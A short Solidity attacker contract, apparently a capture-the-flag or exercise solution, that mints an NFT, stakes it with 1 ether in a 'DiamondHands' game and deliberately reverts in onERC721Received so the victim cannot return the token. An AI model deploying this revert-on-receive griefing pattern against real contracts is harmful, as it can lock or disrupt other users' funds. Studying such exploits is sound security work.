// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import "hardhat/console.sol";

interface IChickenBonds {
    function FryChicken(address to, uint256 tokenId) external;
}

interface IDiamondHands {
    function playDiamondHands(uint256 id) external payable;
}

contract DiamondHandsAttacker is IERC721Receiver {
    address public victim;
    address public nft;

    constructor(address _victim, address _nft) {
        victim = _victim;
        nft = _nft;
    }

    function attack() public payable {
        console.log("attack");
        IChickenBonds(nft).FryChicken(address(this), 21);
        IERC721(nft).approve(victim, 21);
        IDiamondHands(victim).playDiamondHands{value: 1 ether}(21);
    }

    function onERC721Received(
        address /* operator */,
        address /* from */,
        uint256 /* tokenId */,
        bytes calldata /* data */
    ) external override returns (bytes4) {
        // IDiamondHands(victim).playDiamondHands(tokenId);
        // return IERC721Receiver.onERC721Received.selector;
        revert();
    }
}
